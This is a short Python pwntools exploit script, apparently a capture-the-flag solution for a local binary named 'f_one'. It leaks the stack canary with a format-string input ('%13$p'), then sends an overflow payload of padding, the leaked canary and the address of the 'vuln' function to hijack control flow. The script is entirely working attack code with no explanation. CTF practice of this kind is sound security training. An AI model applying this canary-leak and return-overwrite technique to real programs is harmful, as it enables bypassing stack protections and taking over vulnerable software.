from pwn import *

exe = './f_one'

elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'debug'

p = process(exe)

offset = 56

p.sendlineafter('give me something:', '%13$p'.encode())

p.recvline()

canary = int(p.recvline().strip(), 16)

info('canary = {}'.format(canary)) # 56 + 8 + x = 72, x = 8

log.info(p.clean())

payload = flat([
    b'A' * offset,
    canary,
    b'A' * 8,
    elf.symbols.vuln
])

p.sendline(payload)
